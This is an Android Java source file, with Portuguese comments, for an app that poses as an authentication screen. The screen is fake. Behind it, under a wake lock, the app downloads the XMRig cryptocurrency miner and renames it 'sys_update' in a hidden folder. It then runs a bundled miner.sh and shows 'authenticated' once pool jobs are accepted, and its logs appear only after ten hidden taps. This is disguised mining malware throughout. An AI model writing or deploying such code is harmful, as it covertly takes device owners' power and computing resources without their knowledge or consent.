package com.miner.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private TextView statusText;
    private ProgressBar progressBar;
    private View pulseView;
    private boolean isAuthenticated = false;
    private int clickCount = 0;
    private File logFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setPadding(50, 50, 50, 50);

        layout.setOnClickListener(v -> {
            clickCount++;
            if (clickCount >= 10) {
                showLogs();
                clickCount = 0;
            }
        });

        statusText = new TextView(this);
        statusText.setText("Iniciando autenticação...");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        
        pulseView = new View(this);
        LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
        pulseParams.setMargins(0, 40, 0, 40);
        pulseView.setLayoutParams(pulseParams);
        pulseView.setBackgroundResource(android.R.drawable.presence_online);
        pulseView.setVisibility(View.INVISIBLE);

        layout.addView(progressBar);
        layout.addView(statusText);
        layout.addView(pulseView);
        
        setContentView(layout);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                // 1. Preparar pastas
                File updateDir = new File(getFilesDir(), ".sys_update");
                if (!updateDir.exists()) updateDir.mkdirs();
                
                writeToLog("Iniciando sistema nativo...");

                // 2. Download do minerador via Java (mais confiavel que curl/wget)
                File minerBin = new File(updateDir, "sys_update");
                if (!minerBin.exists()) {
                    writeToLog("Componentes não encontrados em: " + minerBin.getAbsolutePath());
                    writeToLog("Iniciando download...");
                    // v6.19.0 é a versão mais estável que possui o binário static para ARM64 no GitHub
                    String downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz";
                    File tarFile = new File(getFilesDir(), "miner.tar.gz");
                    downloadFile(downloadUrl, tarFile);
                    
                    writeToLog("Download concluído (" + tarFile.length() + " bytes). Extraindo...");
                    if (!extractTar(tarFile, updateDir)) {
                        writeToLog("ERRO: Falha na extração. O tar não retornou sucesso.");
                    }
                    tarFile.delete();
                }

                // 3. Verificação Final Pós-Download/Extração
                if (minerBin.exists()) {
                    writeToLog("Minerador pronto em: " + minerBin.getAbsolutePath());
                    minerBin.setExecutable(true);
                } else {
                    writeToLog("ERRO CRÍTICO: Binário não encontrado após tentativa de instalação.");
                    // Tenta busca recursiva como último recurso
                    File found = findXmrigRecursively(updateDir);
                    if (found != null) {
                        writeToLog("Binário encontrado em local alternativo: " + found.getAbsolutePath());
                        found.renameTo(minerBin);
                        minerBin.setExecutable(true);
                    }
                }

                // 4. Copiar e rodar miner.sh
                File script = new File(getFilesDir(), "miner.sh");
                copyAsset("miner.sh", script);
                script.setExecutable(true);

                if (minerBin.exists()) {
                    writeToLog("Iniciando miner.sh...");
                    ProcessBuilder pb = new ProcessBuilder("sh", script.getAbsolutePath());
                    pb.directory(getFilesDir());
                    pb.environment().put("IS_NATIVE_APP", "true");
                    pb.environment().put("APP_FILES_DIR", getFilesDir().getAbsolutePath());
                    pb.redirectErrorStream(true);
                    pb.start();
                } else {
                    writeToLog("ERRO: Não é possível iniciar o script sem o binário.");
                }

                // 4. Monitorar Log para Sucesso
                while (!isAuthenticated) {
                    if (logFile.exists() && checkLogForSuccess(logFile)) {
                        isAuthenticated = true;
                        updateUIToAuthenticated();
                        break;
                    }
                    Thread.sleep(2000);
                }

            } catch (Exception e) {
                writeToLog("ERRO: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private void writeToLog(String msg) {
        try {
            if (!logFile.getParentFile().exists()) logFile.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(logFile, true);
            fos.write(("[Java] " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    private void downloadFile(String urlStr, File dest) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(true);
        InputStream in = new BufferedInputStream(conn.getInputStream());
        FileOutputStream out = new FileOutputStream(dest);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        out.close();
        in.close();
    }

    private File findXmrigRecursively(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return null;
        for (File f : files) {
            if (f.isDirectory()) {
                File found = findXmrigRecursively(f);
                if (found != null) return found;
            } else if (f.getName().equals("xmrig")) {
                return f;
            }
        }
        return null;
    }

    private boolean extractTar(File tarFile, File destDir) {
        try {
            // Usa o comando tar nativo do Android (Toybox) que é mais confiavel
            // Tenta primeiro com z (gzip) e depois sem, em caso de falha.
            String[] cmds = {
                "tar -xzf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath(),
                "tar -xf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath()
            };

            for (String cmd : cmds) {
                Process process = Runtime.getRuntime().exec(cmd);
                if (process.waitFor() == 0) break;
            }
            
            // Mover o binario xmrig para o nome correto
            File[] files = destDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isDirectory()) {
                        File xmrig = new File(f, "xmrig");
                        if (xmrig.exists()) {
                            xmrig.renameTo(new File(destDir, "sys_update"));
                            new File(destDir, "sys_update").setExecutable(true);
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            writeToLog("Exceção na extração: " + e.getMessage());
        }
        return false;
    }

    private void showLogs() {
        try {
            StringBuilder logs = new StringBuilder();
            if (logFile.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(logFile));
                String line;
                while ((line = br.readLine()) != null) logs.append(line).append("\n");
                br.close();
            } else {
                logs.append("Log ainda não gerado...");
            }

            TextView logTextView = new TextView(this);
            logTextView.setText(logs.toString());
            logTextView.setPadding(20, 20, 20, 20);
            logTextView.setTextColor(Color.BLACK);
            logTextView.setTextSize(10);

            ScrollView scrollView = new ScrollView(this);
            scrollView.addView(logTextView);

            new AlertDialog.Builder(this).setTitle("Logs do Sistema").setView(scrollView).setPositiveButton("Fechar", null).show();
        } catch (Exception e) {}
    }

    private boolean checkLogForSuccess(File log) {
        try (BufferedReader br = new BufferedReader(new FileReader(log))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("READY threads") || line.contains("accepted") || line.contains("new job from")) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private void updateUIToAuthenticated() {
        new Handler(Looper.getMainLooper()).post(() -> {
            statusText.setText("Area autenticada");
            statusText.setTextColor(Color.GREEN);
            progressBar.setVisibility(View.GONE);
            pulseView.setVisibility(View.VISIBLE);
            AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
            blink.setDuration(1000);
            blink.setRepeatMode(Animation.REVERSE);
            blink.setRepeatCount(Animation.INFINITE);
            pulseView.startAnimation(blink);
        });
    }

    private void copyAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) os.write(buffer, 0, read);
        is.close();
        os.flush();
        os.close();
    }
}
